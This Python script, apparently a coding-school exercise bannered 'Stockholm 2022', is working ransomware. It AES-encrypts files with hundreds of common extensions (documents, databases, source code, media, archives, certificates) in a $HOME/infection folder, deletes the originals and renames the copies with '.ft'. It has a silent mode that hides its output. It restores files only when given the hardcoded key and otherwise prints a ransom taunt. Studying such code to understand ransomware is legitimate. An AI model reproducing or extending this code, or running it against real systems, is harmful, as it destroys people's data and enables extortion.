import pathlib
import os
import argparse

from base64 import b64decode
from base64 import b64encode

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from sympy import true
  
# Lista de las extensiones de los ficheros a encriptar. 
ext_to_encript = ['.der','.pfx','.crt','csr','p12','.pem','.odt','.ott','.sxw','.uot','.3ds','.max',
'.3dm','.ods','.ots','.sxc','.stc','.dif','.slk','.wb2','.odp','.otp','.sxd','.std','.uop','.odg','.otg','.sxm'     
,'.mml' ,'.lay','.lay6','.asc','.sqlite3','.sqlitedb','.sql','.accdb','.mdb','.db','.dbf','.odb','.frm','.myd'     
,'.myi','.ibd','.mdf','.ldf','.sln','.suo','.cs','.c','.cpp','.pas','.h','.asm','.js','.cmd','.bat','.ps1','.vbs'     
,'.vb','.pl','.dip','.dch','.sch','.brd','.jsp','.php','.asp','.rb','.java','.jar','.class','.sh','.mp3','.wav'     
,'.swf','.fla','.wmv','.mpg','.vob','.mpeg','.asf','.avi','.mov','.mp4','.3gp','.mkv','.3g2','.flv','.wma','.mid'     
,'.m3u','.m4u','.djvu','.svg','.ai','.psd','.nef','.tiff','.tif','.cgm','.raw','.gif','.png','.bmp','.jpg','.jpeg'   
,'.vcd','.iso','.backup','.zip','.rar','.7z','.gz','.tgz','.tar','.bak','.tbk','.bz2','.PAQ','.ARC','.aes','.gpg'
,'.vmx','.vmdk','.vdi','.sldm','.sldx','.sti','.sxi','.602','.hwp','.snt','.onetoc2','.dwg','.pdf','.wk1','.wks'
,'.123','.rtf','.csv','.txt','.vsdx','.vsd','.edb','.eml','.msg','.ost','.pst','.potm','.potx','.ppam','.ppsx'
,'.ppsm','.pps','.pot','.pptm','.pptx','.ppt','.xltm','.xltx','.xlc','.xlm','.xlt','.xlw','.xlsb','.xlsm'
,'.xlsx','.xls','.dotx','.dotm','.dot','.docm','.docb','.docx','.doc']

banner = '''
  _  _ ___    ____                     _                    
 | || |__ \  |  _ \                   | |                   
 | || |_ ) | | |_) | __ _ _ __ ___ ___| | ___  _ __   __ _  
 |__   _/ /  |  _ < / _` | '__/ __/ _ \ |/ _ \| '_ \ / _` | 
    | |/ /_  | |_) | (_| | | | (_|  __/ | (_) | | | | (_| | 
    |_|____| |____/ \__,_|_|  \___\___|_|\___/|_| |_|\__,_| 

Stockholm 2022
Coded by daniel.requena@aol.com


'''

# Clave a usar para encriptar los ficheros 
pwd = 'aXde5Ffg6RdE4Jno'

# Vector de inicializacion
iv = b'1133554433778899'

# Path de directorio $HOME/infection. 
working_dir = os.environ['HOME'] + '/infection'
       
class AESCipher:
    
    def __init__(self, key, vector):        
        self.key = key.encode('utf-8')
        self.vector = vector                
    
    def encrypt(self, data):        
        self.cipher = AES.new(self.key, AES.MODE_CBC, self.vector)
        return b64encode(self.cipher.encrypt(pad(data, AES.block_size)))
    
    def decrypt(self, data):   
        raw = b64decode(data)
        self.cipher = AES.new(self.key, AES.MODE_CBC, self.vector)
        return unpad(self.cipher.decrypt(raw), AES.block_size)


def encrypt_directory(hide_mode, file_list):  
 
    if not hide_mode: 
        print(banner)
        
    for file in file_list.iterdir():
    
        if file.is_file() and file.suffix in ext_to_encript:
                      
            file_to_encrypt = open(file, "rb")
            file_encrypted = AESCipher(pwd,iv).encrypt(file_to_encrypt.read())
            file_to_encrypt.close()
                        
            file_out = open(working_dir + '/' + file.name + '.ft', "wb")
            file_out.write(file_encrypted)
            file_out.close()
            
            os.remove(file)               
            
            if not hide_mode: 
                print('[+]',file.name,'>>>',file.name + '.ft')
    

def desencrypt_directory(file_list):
      
    print(banner)
    
    for file in file_list.iterdir():
    
        if file.is_file() and file.suffix == '.ft':
            
            file_encrypted = open(file, "rb")
            file_plain = AESCipher(pwd,iv).decrypt(file_encrypted.read())
            file_encrypted.close()
            
            # Obtenemos el fichero sin la extension .ft
            file_without_ext = os.path.splitext(file.name)[0]
            
            print('[-]',file.name,'>>>',file_without_ext) 
            
            file_out = open(working_dir + '/' + file_without_ext, "wb")
            file_out.write(file_plain)
            file_out.close()
            
            os.remove(file)    
 
 
def main():
     
    # Lo primero es comprobar que el directorio HOME/infection exista
    if os.path.exists(working_dir):
        
        parser = argparse.ArgumentParser()
        parser.add_argument("-r",
                            action="store",
                            dest="secret_key",
                            help="Key to decrypt")
        parser.add_argument("--reverse",
                            action="store",
                            dest="secret_key",
                            help="Key to decrypt")
        parser.add_argument("-s","--silent",
                            action="store_true",
                            help="doesn't show any output")
        parser.add_argument('-v','--version',
                            action='version',
                            version='%(prog)s 1.0')
    
        args = parser.parse_args()
                
        if args.secret_key == None: 
            
            # Encripta el directorio 
            encrypt_directory(args.silent,pathlib.Path(working_dir))       
        
        elif args.secret_key ==  pwd:
            
            # Desencripta el directorio 
            desencrypt_directory(pathlib.Path(working_dir))
        
        else:
            print(banner)
            print('Pay and stop fooling around. Nerd!!')
    else:       
        print(banner)
        print('The folder',working_dir,'does not exist')
     
if __name__ == "__main__":        
    main()